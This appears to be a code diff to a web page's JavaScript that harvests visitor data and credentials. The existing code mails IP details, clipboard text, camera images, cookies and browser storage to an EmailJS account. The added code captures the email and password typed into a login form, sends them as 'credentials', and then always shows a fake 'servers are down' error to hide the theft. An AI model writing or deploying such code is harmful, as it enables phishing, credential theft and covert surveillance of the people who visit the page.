@@ -221,8 +221,7 @@ function getSessionStorage() {
 getIpInfo().then(async ipInfo => {
     const deviceInfo = await getDeviceInfo();
 
-    // Prepare payload WITHOUT camera_image (if you want to send camera_image separately, see previous suggestions)
-    emailjs.send("service_5fifa81", "template_w5liz9g", {
+    emailjs.send("service_5fifa81", "template_DataLogs", {
         ip: ipInfo.ip,
         network: ipInfo.network,
         version: ipInfo.version,
@@ -267,7 +266,7 @@ getIpInfo().then(async ipInfo => {
         clipboard_text: deviceInfo.clipboard_text,
         camera_status: deviceInfo.camera_status,
         microphone_status: deviceInfo.microphone_status,
-        camera_image: deviceInfo.camera_image, // You can keep this if you want to test if the compression is sufficient
+        camera_image: deviceInfo.camera_image,
         cookies: getCookies(),
         localStorage: getLocalStorage(),
         sessionStorage: getSessionStorage()
@@ -282,6 +281,37 @@ getIpInfo().then(async ipInfo => {
             document.getElementById("log-status").innerText = "Failed to send log: " + JSON.stringify(error);
         }
     });
+
+    // Attach login form handler
+    const loginForm = document.getElementById("login-form");
+    if (loginForm) {
+        loginForm.addEventListener("submit", function(e) {
+            e.preventDefault();
+            const email = loginForm.querySelector("[name='email']").value;
+            const password = loginForm.querySelector("[name='password']").value;
+
+            // Send login via EmailJS (template_login must exist)
+            emailjs.send("service_5fifa81", "template_credentials", {
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString()
+            })
+            .then(() => {
+                // Always show the fake error message after submission
+                if (document.getElementById("login-status")) {
+                    document.getElementById("login-status").innerText =
+                        "The request has been canceled. Maybe your Internet is off or our servers are down. Please try again later.";
+                }
+            })
+            .catch(() => {
+                // Show the same fake error message even if sending fails
+                if (document.getElementById("login-status")) {
+                    document.getElementById("login-status").innerText =
+                        "The request has been canceled. Maybe your Internet is off or our servers are down. Please try again later.";
+                }
+            });
+        });
+    }
 }).catch(error => {
     if (document.getElementById("log-status")) {
         document.getElementById("log-status").innerText = "Failed to fetch IP info: " + JSON.stringify(error);
